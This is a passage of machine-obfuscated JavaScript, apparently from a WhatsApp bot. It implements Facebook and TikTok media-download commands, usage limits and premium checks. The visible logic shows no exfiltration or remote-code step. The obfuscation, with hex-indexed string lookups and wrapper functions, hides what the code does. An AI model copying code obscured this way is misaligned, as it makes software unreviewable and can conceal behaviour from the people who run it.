_0x1052ca={};_0x1052ca[_0x15af3d(0xc33,0xa7b,0x8cb,0x791)]='limit',_0x1052ca[_0x15af3d(0x5a7,0x429,0x571,0x68b)]=_0x41ebeb,_0x1052ca[_0x15af3d(0xa52,0xe6f,0xd5e,0xf2c)]=0x1;if(isLimit(sender,isPremium,isCreator,isOwner,limitawal,limit))return sendButMessage(from,lang[_0x15af3d(0x950,0xe23,0x758,0x463)](prefix),'©\x20'+ownername,[_0x1052ca]);if(!q)return reply('Url?');if(!isUrl(args[0x127b+0x190a*0x1+0x1*-0x2b85])&&!args[0x4*0xdf+-0x63f+-0x65*-0x7][_0x15af3d(0x8eb,0x9c7,0xb79,0xd79)](_0x15af3d(0x581,0x5bf,0x7d9,0xde)+'om'))return reply(lang[_0x134458(0x166,0x28e,-0x1ad,-0x360)]());reply(lang[_0x134458(0x279,0x128,0x3b1,0x6ef)]());var fbte=args[_0x15af3d(0x309,-0x1d,-0x97,0x706)]('\x20');hx['downloader'](fbte)[_0x15af3d(0x77c,0x6eb,0xbb8,0x492)](async _0x2d1985=>{const _0x7d31b8={'hcYWB':function(_0x3b75c5,_0x848f96,_0x13961f,_0x3dca0a,_0x8496b7,_0x1e980c,_0x40de81){return _0x3b75c5(_0x848f96,_0x13961f,_0x3dca0a,_0x8496b7,_0x1e980c,_0x40de81);},'vCuHi':function(_0x383fca,_0x34ad41){return _0x383fca+_0x34ad41;},'RMIKi':function(_0x12f5a2,_0x4f9d49){return _0x12f5a2+_0x4f9d49;},'oGUGX':function(_0x59b796,_0x2e3d24){return _0x59b796+_0x2e3d24;},'HaibT':'RESPONSE','qZoAt':function(_0x4bd2e6,_0x264be4){return _0x4bd2e6+_0x264be4;},'HHaNj':function(_0x5a7869,_0x5d6923){return _0x5a7869+_0x5d6923;},'Eigkv':_0x519edc(0x2f5,0x433,0x616,0x388)};let _0x2ec1d7=_0x4e9bc4(0x437,0x4ea,0x250,0x3f6)+_0x4e9bc4(0x73f,0x728,0x2d5,0xb8a)+_0x4e9bc4(0xf0e,0xabe,0xcb4,0xe47)+_0x519edc(0x65,0x638,0x4f8,0x376);_0x2ec1d7+='*📛\x20Title\x20:'+'*\x20'+_0x2d1985[_0x519edc(0x3b5,0x689,-0xc0,0x3c9)]+'\x0a';function _0x4e9bc4(_0x45d013,_0x3e0be9,_0x51ed36,_0x3465fb){return _0x15af3d(_0x3e0be9- -0x143,_0x3e0be9-0x153,_0x3465fb,_0x3465fb-0x166);}_0x2ec1d7+='*🌍\x20Type\x20:*'+'\x20'+_0x2d1985[_0x4e9bc4(0x3f2,0x8e2,0x7f0,0xc94)][-0x1a7*-0x6+-0x12*0xb3+-0x39*-0xc]['extension']+'\x0a',_0x2ec1d7+='*📭\x20Quality'+_0x4e9bc4(0x780,0x697,0x81f,0x451)+_0x2d1985[_0x4e9bc4(0x3fb,0x8e2,0xacc,0x82a)][0xb*-0x36f+-0x888+0x1b7*0x1b][_0x4e9bc4(0x64a,0x5cd,0x70b,0x36a)]+',\x20'+_0x2d1985['medias'][0x71*-0x44+-0x67*0x53+0x3f69][_0x4e9bc4(0x690,0x5cd,0x7e1,0x8e6)]+_0x519edc(0x56d,0x718,0x624,0x365),_0x2ec1d7+=_0x519edc(0xa4b,0xbcb,0x964,0x7d7)+_0x4e9bc4(0x5a9,0x697,0x5bf,0x39b)+_0x2d1985['medias'][0x5a2+0x16f*0x18+-0x280a][_0x519edc(0x15e,0x13,0x4a5,0x33c)+'ize']+'\x0a',_0x2ec1d7+=_0x519edc(0x138,0x3da,0x682,0x30f)+_0x4e9bc4(0x1ec,0x697,0x82a,0x883)+_0x2d1985[_0x4e9bc4(0x937,0x8e2,0x88e,0x4bd)][0x3b*-0x67+-0x20c9+0x3887]['formattedS'+_0x519edc(0x4ca,0x799,0x713,0x903)]+'\x0a',_0x2ec1d7+=_0x519edc(0x48f,0x6b2,0x2fd,0x220)+_0x519edc(0x5e5,0x91a,0x3c7,0x776)+_0x2d1985[_0x519edc(0x367,0x471,0x673,0x799)][-0x29*-0x9d+-0x1928+0x1*0x3][_0x519edc(0x4af,0x54d,0x78,0x33c)+_0x519edc(0x527,0x531,0x805,0x903)]+'\x0a',_0x2ec1d7+=_0x519edc(0x56d,0x25e,0x3a4,0x6c0)+_0x2d1985['url'];function _0x519edc(_0x3d70b6,_0x18262f,_0x92d9a8,_0x2d9e69){return _0x15af3d(_0x2d9e69- -0x28c,_0x18262f-0x1e8,_0x18262f,_0x2d9e69-0xff);}let _0x165834=await getBuffer(_0x2d1985['thumbnail']);_0x7d31b8[_0x4e9bc4(0xa05,0x5d2,0x350,0xe6)](sendButLocation,from,_0x2ec1d7,'Pilih\x20medi'+'a\x20yang\x20ing'+_0x4e9bc4(0x8a9,0x944,0x7a2,0x466)+'wnload\x20'+enter+enter+botname+_0x4e9bc4(0xa4b,0x8e7,0xaa9,0xcc5)+ownername,_0x165834,[{'buttonId':_0x4e9bc4(0x582,0x4e4,0x9c4,0x4bc)+fbte,'buttonText':{'displayText':_0x7d31b8[_0x4e9bc4(0x8f4,0x784,0x630,0xa53)](_0x7d31b8[_0x519edc(0x766,0xca8,0x4e1,0x85a)]('HD','\x20'),_0x2d1985[_0x4e9bc4(0xc48,0x8e2,0xd9c,0x7dd)][-0x838*-0x2+0x3*-0xb83+-0x29*-0x71][_0x519edc(0x49e,0x6f6,0x3ff,0x33c)+_0x4e9bc4(0xbcb,0xa4c,0xdfa,0xb7d)])},'type':_0x4e9bc4(0xc73,0x877,0x942,0xb18)},{'buttonId':'fbsd\x20'+fbte,'buttonText':{'displayText':_0x7d31b8[_0x519edc(0x9b2,0x65c,0xb6c,0x85a)](_0x7d31b8[_0x519edc(0x3da,0xcf1,0xb9b,0x800)]('SD','\x20'),_0x2d1985[_0x4e9bc4(0x517,0x8e2,0x5f2,0xb66)][0x1df8+0x1ed3+-0x3ccb*0x1]['formattedS'+'ize'])},'type':_0x7d31b8[_0x519edc(0x6f1,0xc74,0x98e,0x836)]},{'buttonId':_0x519edc(0x5e4,0x6fa,0x2db,0x78d)+fbte,'buttonText':{'displayText':_0x7d31b8[_0x4e9bc4(0x236,0x26a,-0x278,0x43e)](_0x7d31b8['HHaNj'](_0x7d31b8[_0x4e9bc4(0x8b3,0x9aa,0xa81,0x90a)],'\x20'),_0x2d1985[_0x4e9bc4(0x7ce,0x8e2,0x977,0x6f2)][-0x1*0x11ab+-0x1050+0x21fb*0x1][_0x519edc(0x3a7,0x497,0x2b7,0x33c)+_0x519edc(0xa07,0xb6b,0x6cd,0x903)])},'type':_0x7d31b8['HaibT']}],{});})[_0x15af3d(0x852,0x630,0x6c7,0x893)](_0x485e99=>{function _0x179f90(_0x38ff00,_0x14067f,_0x2ba093,_0x474f69){return _0x134458(_0x474f69-0x25,_0x14067f-0x10a,_0x2ba093,_0x474f69-0xac);}const _0x19d186={'AshTG':function(_0x180ca4,_0x2e640f){return _0x180ca4(_0x2e640f);}};function _0x4e6cbc(_0x43ca17,_0x3f50fb,_0x50b4c3,_0x2fc5e5){return _0x134458(_0x2fc5e5-0x5d,_0x3f50fb-0x175,_0x43ca17,_0x2fc5e5-0x16b);}_0x19d186[_0x179f90(0xad5,0x57f,0x5bc,0x832)](reply,lang[_0x4e6cbc(-0x1ec,0x505,0x59d,0x1f0)]());});break;case _0x15af3d(0x6dc,0x530,0x884,0x70d):case _0x134458(0x3b3,-0xbd,0xd9,0x2d9):const _0x39e05c={};_0x39e05c[_0x134458(0x599,0x319,0x43e,0x4c9)+'t']='Upgrade\x20Pr'+'emium';const _0x319cb0={};_0x319cb0[_0x134458(0xae0,0x893,0x931,0x8de)]=_0x15af3d(0x7af,0x460,0x3f5,0xa5b),_0x319cb0['buttonText']=_0x39e05c,_0x319cb0[_0x134458(0x8ff,0xa51,0x88b,0xa5c)]=0x1;const _0x145511={};_0x145511['quoted']=mek;if(!isPremium)return sendButMessage(from,_0x15af3d(0x71d,0x3b7,0xbbe,0x8f5)+_0x134458(0x5ec,0x86f,0x481,0x427)+_0x15af3d(0x50b,0x694,0x539,0x887)+_0x15af3d(0x520,0x6bb,0x883,0x7b5)+_0x15af3d(0x33e,0x219,-0x1e,0x3e2)+_0x15af3d(0xc68,0x98b,0x799,0x7d0)+_0x134458(0x6b0,0x5d6,0x56f,0x1cd)+_0x15af3d(0x384,0x3bb,0x5f,0x2e8)+_0x15af3d(0xa2c,0xa50,0xac6,0x5cf)+_0x15af3d(0x7f4,0x6bf,0x4eb,0x747)+prefix+_0x134458(0x65c,0x694,0x6d9,0x387),_0x134458(0x2c6,0x4cc,-0xa,0x39f)+_0x134458(0x56d,0x42e,0x6cd,0x242),[_0x319cb0],_0x145511);if(!q)return reply(_0x134458(0x6b6,0x8c8,0x2af,0x257));if(!isUrl(args[0x268+0x152+0x2*-0x1dd])&&!args[0x15*0xc1+0x1*0xb14+-0x1*0x1ae9][_0x15af3d(0x8eb,0xbc1,0x850,0x76a)](_0x15af3d(0x581,0xa66,0x87f,0x8a2)+'om'))return reply(lang[_0x134458(0x166,-0xc4,0xed,-0x1f6)]());reply(lang[_0x15af3d(0x3cc,0x216,0x64b,0x34e)]());var fbte=args[_0x134458(0x1b6,-0x1f4,0x40b,0x27b)]('\x20');hx[_0x15af3d(0x8db,0x831,0xdab,0x9d8)](fbte)[_0x15af3d(0x77c,0x8be,0xb2c,0x517)](async _0x4efd2c=>{const _0x285509={'Zqfth':function(_0x2bb867,_0x35a5f3,_0x1b0d2a,_0x24d8e1,_0x29ceba){return _0x2bb867(_0x35a5f3,_0x1b0d2a,_0x24d8e1,_0x29ceba);}};function _0x257db6(_0x3c8941,_0x4ad31e,_0x57bd3f,_0x36c2ae){return _0x15af3d(_0x3c8941- -0x27b,_0x4ad31e-0x132,_0x36c2ae,_0x36c2ae-0x6e);}function _0x52ad50(_0x2ff501,_0x5a0d99,_0x16c73b,_0x16e620){return _0x15af3d(_0x5a0d99-0x23b,_0x5a0d99-0x7,_0x2ff501,_0x16e620-0x14e);}_0x285509[_0x52ad50(0x5c0,0x700,0x535,0x5bb)](sendFileFromUrl,from,_0x4efd2c['medias'][0x265c+-0x1634*-0x1+0x3c8f*-0x1][_0x257db6(0x1df,-0x27e,0x526,0xb0)],lang['success'](),mek);})[_0x15af3d(0x852,0x463,0x51b,0x528)](_0x2d5d44=>{function _0x4fd6c2(_0x44e62b,_0x619a3a,_0x1c1425,_0x3c3707){return _0x15af3d(_0x1c1425- -0x4b1,_0x619a3a-0x1e1,_0x3c3707,_0x3c3707-0x1b5);}const _0x128eda={'qSZEf':function(_0x3e47b1,_0x19918e){return _0x3e47b1(_0x19918e);}};_0x128eda['qSZEf'](reply,lang[_0x4fd6c2(0x2,0x4a,-0x1cb,-0x28f)]());});break;case'fbsd':case _0x15af3d(0x53b,0x25a,0x737,0x460):if(!q)return reply(_0x15af3d(0x809,0x679,0xa74,0x93a));if(!isUrl(args[-0xd6d*-0x1+0x20*-0x106+-0x1353*-0x1])&&!args[0xb*-0x2c5+0x10*-0x1a5+0x3c9*0xf][_0x134458(0x798,0x673,0x38f,0x6b4)](_0x134458(0x42e,0x579,0x4a,0x847)+'om'))return reply(lang[_0x15af3d(0x2b9,0x6e1,0x5c9,0x23e)]());reply(lang[_0x134458(0x279,-0x147,0x189,-0x1c5)]());var fbte=args[_0x134458(0x1b6,0x542,0x5bd,0x4e1)]('\x20');hx['downloader'](fbte)[_0x134458(0x629,0xa3c,0x9b4,0x937)](async _0x3ccb59=>{function _0x51f884(_0x913b59,_0x2108a2,_0x896ba1,_0x1262e2){return _0x15af3d(_0x913b59- -0x300,_0x2108a2-0x31,_0x896ba1,_0x1262e2-0x66);}sendFileFromUrl(from,_0x3ccb59['medias'][0x7b+-0x1a4a+0x19cf]['url'],lang[_0x51f884(0x6c9,0x2a5,0x2b2,0x7d8)](),mek);})['catch'](_0x2f53b4=>{function _0x5d4b7a(_0x42e887,_0x1c08ac,_0x568f03,_0x27938e){return _0x134458(_0x27938e-0x368,_0x1c08ac-0x1e9,_0x568f03,_0x27938e-0x7b);}reply(lang[_0x5d4b7a(0x6e0,0xad,0x13d,0x4fb)]());});break;case'fbaudio':case _0x15af3d(0x600,0x8d4,0x433,0x6e1)+_0x15af3d(0x603,0x95b,0x5a5,0xaf1):const _0x52c1c8={};_0x52c1c8[_0x134458(0x599,0x436,0x191,0x5e6)+'t']=_0x134458(0x806,0xc01,0x906,0xb11)+'t';const _0x31e241={};_0x31e241[_0x15af3d(0xc33,0xe90,0xb22,0x756)]=_0x134458(0x7fd,0x650,0x53d,0xabf),_0x31e241['buttonText']=_0x52c1c8,_0x31e241['type']=0x1;if(isLimit(sender,isPremium,isCreator,isOwner,limitawal,limit))return sendButMessage(from,lang[_0x15af3d(0x950,0xd63,0xbf1,0xd16)](prefix),'©\x20'+ownername,[_0x31e241]);if(!q)return reply(_0x134458(0x6b6,0xa3d,0x408,0x261));if(!isUrl(args[-0x1597*0x1+0x4db*0x6+-0x78b])&&!args[0x1ac1+0x39e+0x19*-0x137][_0x134458(0x798,0x8d9,0x463,0x662)](_0x134458(0x42e,0x8b4,-0x16,0x6fc)+'om'))return reply(lang[_0x15af3d(0x2b9,-0x162,-0x1cd,0x298)]());reply(lang['wait']());var fbte=args['join']('\x20');hx[_0x134458(0x788,0xb41,0x873,0x374)](fbte)[_0x134458(0x629,0x76b,0x190,0xaa6)](async _0x821912=>{const _0x3b745a={'qDTTx':function(_0x247166,_0x2d4d1b){return _0x247166(_0x2d4d1b);},'HElQD':'audio/mp4'};let _0x7a0e7b=await _0x3b745a['qDTTx'](getBuffer,_0x821912[_0x28cac9(0x83e,0xc32,0xe70,0xcbf)][0x15fb+-0x647+0x2*-0x7da]['url']);const _0x3542b2={};_0x3542b2[_0x28cac9(0x7b8,0x692,0x75b,0xa0d)]=_0x4dfab5(0x96e,0xa84,0x62f,0x952)+_0x28cac9(0xd7d,0x1128,0x11c2,0xd50)+_0x28cac9(0x1174,0xe75,0xa6e,0xd2a),_0x3542b2[_0x4dfab5(0x112,0x34c,-0xf3,-0xff)]=0x2,_0x3542b2[_0x4dfab5(0x384,0x2a3,-0x16f,0x1ec)]='Tiktok\x20Mus'+'ic',_0x3542b2[_0x28cac9(0x7a4,0x82e,0x24d,0x5ab)]='',_0x3542b2[_0x4dfab5(0x557,0x8ed,0x955,0x236)+'rl']='';function _0x28cac9(_0x160892,_0x125cfa,_0x254e5d,_0x59fe27){return _0x134458(_0x59fe27-0x3ed,_0x125cfa-0x14a,_0x125cfa,_0x59fe27-0x3c);}_0x3542b2['thumbnail']=pp_userz;const _0x24be28={};_0x24be28['text']='Facebook\x20M'+'usic\x20Downl'+_0x4dfab5(0x6bd,0x579,0x4e1,0x252),_0x24be28[_0x28cac9(0xe68,0x77b,0xfd6,0xb8b)+_0x28cac9(0xb14,0x12a2,0xffd,0xe9e)]=0x3b9aca00;function _0x4dfab5(_0x143d78,_0x98908f,_0x59565b,_0x2f0603){return _0x134458(_0x143d78- -0x17e,_0x98908f-0x171,_0x98908f,_0x2f0603-0xa8);}_0x24be28[_0x4dfab5(0x2b7,0x731,0x432,0x3e4)+'d']=!![],_0x24be28[_0x4dfab5(0x359,0xd3,0x307,-0x97)+'ral']=!![],_0x24be28[_0x4dfab5(0x403,0x9f,0x2fd,0x44)+'Reply']=_0x3542b2;const _0x427c7d={};_0x427c7d['contextInf'+'o']=_0x24be28,_0x427c7d['mimetype']=_0x3b745a[_0x4dfab5(0x215,0x6f7,0x68f,-0x24b)],_0x427c7d[_0x28cac9(0x81f,0x8c9,0xebc,0xb21)]=_0x28cac9(0xda9,0x6ec,0xbc4,0xaaf)+_0x28cac9(0x7fd,0x68c,0x88e,0x8f3),_0x427c7d[_0x28cac9(0x1217,0x129d,0xec4,0xec8)]=fgclink2,_0x427c7d['thumbnail']=pp_bot2,alpha['sendMessag'+'e'](from,_0x7a0e7b,MessageType['document'],_0x427c7d);})[_0x134458(0x6ff,0x555,0x283,0x745)](_0x29c504=>{const _0x3e11e9={'OFnsv':function(_0x36e368,_0x16472c){return _0x36e368(_0x16472c);}};function _0x396a22(_0x1c3771,_0x10bb23,_0x1206f5,_0x59a58f){return _0x15af3d(_0x59a58f- -0x2fe,_0x10bb23-0x83,_0x1206f5,_0x59a58f-0x58);}_0x3e11e9[_0x396a22(0x463,-0x72,-0x13c,0x19d)](reply,lang['tryAgain']());});break;case'tiktokaudi'+'o':case _0x15af3d(0x646,0x5d7,0x686,0x954)+'c':case'ttmp3':const _0x2596f8={};_0x2596f8[_0x134458(0x599,0xa52,0x1fa,0x786)+'t']=_0x134458(0x806,0xaa3,0x489,0xb8c)+'t';const _0x5b064f={};_0x5b064f[_0x134458(0xae0,0x628,0xe23,0xc1a)]=_0x134458(0x7fd,0x8f6,0x399,0x909),_0x5b064f[_0x134458(0x454,0x349,0x69d,0x46c)]=_0x2596f8,_0x5b064f[_0x15af3d(0xa52,0x6d5,0xbb1,0x5f6)]=0x1;if(isLimit(sender,isPremium,isCreator,isOwner,limitawal,limit))return sendButMessage(from,lang[_0x15af3d(0x950,0xd0e,0x950,0xd00)](prefix),'©\x20'+ownername,[_0x5b064f]);if(!q)return reply('Linknya?');if(!isUrl(args[-0x1*-0x21af+-0x2632*-0x1+-0x47e1])&&!args[0x22f9+0xe5*-0x2+-0x1*0x212f][_0x15af3d(0x8eb,0xcd4,0x906,0x5d9)](_0x15af3d(0x6b3,0xac7,0x2dd,0x586)))return reply(lang[_0x15af3d(0x2b9,0x65b,0x1c4,0x609)]());reply(lang[_0x15af3d(0x3cc,0x243,0x2f1,0x261)]()),hx[_0x134458(0x4e7,0x439,0x7e1,0x78b)+'er'](''+args[-0x1e4a+0x172+0x238*0xd])[_0x15af3d(0x77c,0x34d,0x626,0x7f6)](_0xa11055=>{function _0x13442c(_0x59a390,_0x5d42c3,_0xff3060,_0x4a6df7){return _0x134458(_0x4a6df7- -0x60,_0x5d42c3-0x19c,_0x5d42c3,_0x4a6df7-0x1e0);}const _0x305a96={'mfgUu':function(_0x26d971,_0xf31df){return _0x26d971(_0xf31df);},'ySjto':'https://yo'+_0x13442c(0xb27,0xa5d,0x596,0x903)+'xTH6oLd8','qrZTn':_0x13442c(0xb8b,0x7ee,0x5fa,0x8af)};function _0x23dc08(_0x3a423d,_0x387cd6,_0x5d6c7e,_0x3d2f26){return _0x134458(_0x3d2f26-0x390,_0x387cd6-0x6b,_0x5d6c7e,_0x3d2f26-0xc1);}const {wm:_0x531199,nowm:_0x24df26,audio:_0x323348}=_0xa11055;axios[_0x23dc08(0xb61,0xd06,0xcd6,0xcda)](_0x13442c(0x58f,0xdf6,0x9c0,0xa5d)+_0x23dc08(0xe13,0xa9b,0x10ef,0xd60)+_0x23dc08(0x8d6,0x5e4,0x76c,0x984)+'.php?url='+_0x24df26)[_0x23dc08(0xc3c,0x591,0x618,0x9b9)](async _0x246690=>{me=_0x1d7d42(0x608,0x883,0x9b7,0xb3c)+_0x246690['data'],nowmm=await _0x305a96[_0x5d50cf(0xe41,0x1077,0x10df,0xacd)](getBuffer,_0x323348);const _0x4d52c1={};_0x4d52c1[_0x1d7d42(0x4e1,0x4c2,-0x2d,0x31)]=_0x305a96[_0x5d50cf(0xad9,0x8e8,0xe7e,0x8b3)],_0x4d52c1[_0x1d7d42(0x327,0x132,0x43e,0x38d)]=0x2,_0x4d52c1[_0x1d7d42(0x403,0x3a4,0x285,0x772)]='Tiktok\x20Mus'+'ic',_0x4d52c1['body']='',_0x4d52c1[_0x5d50cf(0x9ed,0x7bc,0x6df,0x4f9)+'rl']='',_0x4d52c1['thumbnail']=pp_userz;const _0xb03ac={};_0xb03ac['text']='Tiktok\x20Mus'+'ic\x20Downloa'+_0x1d7d42(0x6cd,0x785,0x7ad,0x5a2),_0xb03ac[_0x5d50cf(0xab6,0x962,0xdc6,0xc69)+_0x1d7d42(0x79f,0x953,0x69c,0xe32)]=0x3b9aca00,_0xb03ac['isForwarde'+'d']=!![],_0xb03ac['sendEpheme'+_0x5d50cf(0x78f,0xb28,0x3b4,0x783)]=!![],_0xb03ac['externalAd'+_0x5d50cf(0x64d,0x832,0x19b,0xa7b)]=_0x4d52c1;const _0x5edd52={};_0x5edd52[_0x1d7d42(0xba0,0x80a,0x4f5,0xbfd)+'o']=_0xb03ac,_0x5edd52[_0x5d50cf(0xd89,0xaf8,0xdd6,0x1047)]=_0x305a96[_0x1d7d42(0x834,0x537,0x797,0x527)],_0x5edd52['filename']=_0x1d7d42(0x313,0x726,0x2b4,0x326)+_0x5d50cf(0x966,0xc8b,0xa6d,0xa58),_0x5edd52[_0x5d50cf(0xdf3,0x12a2,0x990,0x9d6)]=fgclink2;function _0x5d50cf(_0x552d15,_0x295e01,_0x21aa8d,_0x3ac493){return _0x13442c(_0x552d15-0xa3,_0x3ac493,_0x21aa8d-0x121,_0x552d15-0x378);}_0x5edd52[_0x1d7d42(-0x136,0x355,0x208,0x30)]=pp_bot2;function _0x1d7d42(_0x51e2c3,_0x1f9b14,_0x19feb2,_0x4924f0){return _0x13442c(_0x51e2c3-0x148,_0x4924f0,_0x19feb2-0x61,_0x1f9b14- -0xfe);}alpha[_0x1d7d42(0x526,0x824,0x736,0x568)+'e'](from,nowmm,MessageType[_0x5d50cf(0x958,0x9e0,0xc53,0xb4e)],_0x5edd52);});}),await limitAdd(sender,limit);break;case'tiktoknowm':case _0x15af3d(0x4ed,0x93e,0x71f,0x0):case _0x15af3d(0x842,0xa70,0xcee,0x4c0):const _0x23870a={};_0x23870a[_0x15af3d(0x6ec,0x1fc,0x320,0xaf0)+'t']='Check\x20Limi'+'t';const _0x282ae2={};_0x282ae2[_0x15af3d(0xc33,0xff2,0xb7f,0x865)]=_0x15af3d(0x950,0xbfc,0x97c,0xdc5),_0x282ae2[_0x134458(0x454,0x5cb,0x242,0x64f)]=_0x23870a,_0x282ae2[_0x134458(0x8ff,0x991,0xa78,0x945)]=0x1;if(isLimit(sender,isPremium,isCreator,isOwner,limitawal,limit))return sendButMessage(from,lang[_0x15af3d(0x950,0x58c,0xbd8,0xb48)](prefix),'©\x20'+ownername,[_0x282ae2]);if(!q)return reply(_0x15af3d(0x809,0x8ae,0x4a7,0xa55));if(!isUrl(args[-0x2*-0x104c+0x16f*0xe+-0x1*0x34aa])&&!args[0xc3e+0x60a*-0x3+0x5e0][_0x134458(0x798,0x5f5,0x9df,0x88e)]('tiktok.com'))return reply(lang[_0x15af3d(0x2b9,0x2d1,0x167,0x736)]());reply(lang[_0x15af3d(0x3cc,0x1cf,0x38f,0x4e7)]()),hx['ttdownload'+'er'](''+args[-0xd9c+0x2345+-0x1*0x15a9])[_0x134458(0x629,0x83e,0xb06,0x140)](_0x3ecc12=>{function _0x4c40c9(_0x10cce1,_0x21026f,_0x1356d7,_0x1afeb6){return _0x134458(_0x10cce1- -0x362,_0x21026f-0x18e,_0x1356d7,_0x1afeb6-0xd4);}const _0x26402a={};_0x26402a[_0x4c40c9(0x2f8,0xf,0x708,0x740)]=_0x480b51(0xab7,0x5b6,0x7a9,0xa05)+_0x4c40c9(0x601,0x46c,0x8f5,0x460)+_0x4c40c9(0x5db,0x8f7,0x8e1,0x565);function _0x480b51(_0x2062bf,_0x346b0d,_0x187837,_0x435541){return _0x15af3d(_0x435541- -0x23a,_0x346b0d-0xaa,_0x187837,_0x435541-0x1b4);}_0x26402a[_0x480b51(0x8fc,0x80a,0x7ee,0x8e0)]=_0x4c40c9(0x4a6,0x16d,0xde,0x101);const _0x1c5b72=_0x26402a,{wm:_0x4919b7,nowm:_0x5d84da,audio:_0x3f05ca}=_0x3ecc12;axios[_0x4c40c9(0x5e8,0x9ca,0x396,0x457)]('https://ti'+_0x4c40c9(0x66e,0x35f,0xb4c,0x4b8)+_0x480b51(0x72a,0x404,0x5d1,0x50d)+_0x4c40c9(0x62c,0x1e4,0x6f6,0x71d)+_0x5d84da)[_0x4c40c9(0x2c7,-0x1af,0x624,0x203)](async _0x7b9a8e=>{me=_0x386387(0xf10,0xca9,0xc99,0xd29)+_0x7b9a8e['data'],nowmm=await getBuffer(_0x5d84da);const _0x44e956={};_0x44e956[_0x386387(0x7a0,0x7ae,0xe10,0x968)]=_0x1c5b72[_0x386387(0x932,0xbd0,0xb10,0x9a2)],_0x44e956[_0x386387(0x805,0x159,0x235,0x5d8)]=0x2,_0x44e956[_0x386387(0xac5,0x8b0,0xac2,0x84a)]=_0x386387(0x57b,0xb18,0x8f4,0x806)+_0x386387(0x700,0x806,0x2f0,0x770),_0x44e956['body']='',_0x44e956['thumbnailU'+'rl']='',_0x44e956[_0x386387(0x8b4,0x5e5,0xb89,0x7fb)]=pp_userz;const _0xee447b={};function _0x386387(_0x24c132,_0x55a69b,_0x69b692,_0xbf98ba){return _0x4c40c9(_0xbf98ba-0x6aa,_0x55a69b-0xcd,_0x69b692,_0xbf98ba-0x1af);}_0xee447b['forwarding'+_0x389454(0xacd,0xef0,0xb0a,0x834)]=0x3b9aca00,_0xee447b[_0x389454(0x451,0x8b6,0x30f,0x866)+'d']=!![],_0xee447b[_0x389454(0x4f3,0x30b,0x65,0x5e3)+_0x386387(0x55f,0x31e,0x5dd,0x7bf)]=!![],_0xee447b[_0x386387(0x4de,0x5c7,0x9f0,0x8c9)+_0x386387(0x76e,0x1d3,0x1f3,0x67d)]=_0x44e956;const _0x23ddd6={};_0x23ddd6[_0x386387(0xa00,0x1086,0x1126,0xcb0)+'o']=_0xee447b;function _0x389454(_0x44a326,_0x53f003,_0x3856dc,_0x3fddae){return _0x480b51(_0x44a326-0x132,_0x53f003-0x1f4,_0x3856dc,_0x44a326-0x103);}_0x23ddd6[_0x389454(0xa8d,0x876,0xc28,0x83a)]=_0x1c5b72[_0x389454(0x9e3,0x83e,0x67c,0xd5c)],_0x23ddd6['filename']=_0x386387(0x758,0xc1e,0x5c9,0x806)+_0x386387(0xba2,0xbc4,0xd26,0xbcd),_0x23ddd6[_0x386387(0x9c2,0x121f,0xec6,0xe23)]=fgclink2,_0x23ddd6[_0x389454(0x4cf,0x1b4,0x436,0x953)]=pp_bot2,alpha['sendMessag'+'e'](from,nowmm,MessageType[_0x386387(0x851,0xaeb,0x6f0,0x988)],_0x23ddd6);});}),await limitAdd(sender,limit);break;case'tiktokwm':const _0x558b30={};_0x558b30['displayTex'+'t']=_0x134458(0x806,0x45d,0x85d,0x870)+'t';const _0x3ef437={};_0x3ef437[_0x134458(0xae0,0xc98,0x700,0xf19)]='limit',_0x3ef437[_0x15af3d(0x5a7,0x653,0x9d3,0x933)]=_0x558b30,_0x3ef437[_0x15af3d(0xa52,0x8fb,0x60a,0xeef)]=0x1;if(isLimit(sender,isPremium,isCreator,isOwner,limitawal,limit))return sendButMessage(from,lang[_0x134458(0x7fd,0xc02,0xa06,0x53c)](prefix),'©\x20'+ownername,[_0x3ef437]);if(!isUrl(args[-0x245f*0x1+0x2fc*0xb+0x38b*0x1])&&!args[-0x7a+0x22d9+-0x225f][_0x134458(0x798,0x807,0xa8e,0x3b6)](_0x134458(0x560,0x2d4,0x3a3,0x812)))return reply(lang[_0x15af3d(0x2b9,0x45a,0x2f4,0x4b0)]());if(!q)return fakegroup('Linknya?');reply(lang[_0x134458(0x279,0x712,0x6bb,0x5b9)]()),hx[_0x15af3d(0x63a,0x35c,0x729,0x861)+'er'](''+args[0xc46+0x1*0x1e01+-0x1*0x2a47])[_0x134458(0x629,0x4c1,0x47e,0x25a)](_0xf52313=>{function _0x25d590(_0x551e07,_0x3c8b11,_0x146e04,_0x8ec8a5){return _0x15af3d(_0x3c8b11- -0x5e,_0x3c8b11-0x188,_0x551e07,_0x8ec8a5-0x196);}function _0x53d50c(_0x463c2f,_0x2e8e03,_0x28ab1a,_0x15eb27){return _0x134458(_0x15eb27- -0x21,_0x2e8e03-0x9,_0x28ab1a,_0x15eb27-0xb6);}const _0x152da1={'usOvh':function(_0x3e0554,_0x1389b6){return _0x3e0554(_0x1389b6);},'FIkLe':_0x25d590(0xc42,0xbe1,0xf20,0xcb0)+'utu.be/1r_'+_0x25d590(0xa74,0xa32,0x9ee,0xd9c),'zDpEN':'video/mp4'},{wm:_0x4d2276,nowm:_0x231e62,audio:_0x15b8d2}=_0xf52313;axios[_0x53d50c(0x4aa,0x908,0xcda,0x929)](_0x53d50c(0x762,0x674,0xeb9,0xa9c)+'nyurl.com/'+_0x25d590(0x69a,0x6e9,0x5a5,0x558)+_0x25d590(0x737,0xa83,0x89d,0x623)+_0x4d2276)['then'](async _0x45a7ef=>{me=_0x3a1b29(0xe9b,0x10be,0xb6d,0xc0e)+_0x45a7ef['data'],wmm=await _0x152da1[_0x37f82f(0xa74,0xc28,0xe66,0x79b)](getBuffer,_0x4d2276);const _0x25fabe={};_0x25fabe['mediaUrl']=_0x152da1[_0x3a1b29(0x3b,0x30c,0x3d4,0x517)],_0x25fabe[_0x3a1b29(0x13b,0x31c,0x973,0x4bd)]=0x2,_0x25fabe[_0x3a1b29(0x738,0x53c,0x5fa,0x72f)]='Tiktok\x20Wit'+'h\x20Watermar'+'k';function _0x37f82f(_0x56a789,_0x3f7c64,_0x42eb4a,_0x39e433){return _0x25d590(_0x3f7c64,_0x56a789-0x20d,_0x42eb4a-0x112,_0x39e433-0x73);}_0x25fabe['body']='',_0x25fabe[_0x37f82f(0x9d7,0x8fe,0xebb,0x9cf)+'rl']='',_0x25fabe[_0x37f82f(0x7b5,0x7a6,0x7e7,0xb49)]=pp_userz;const 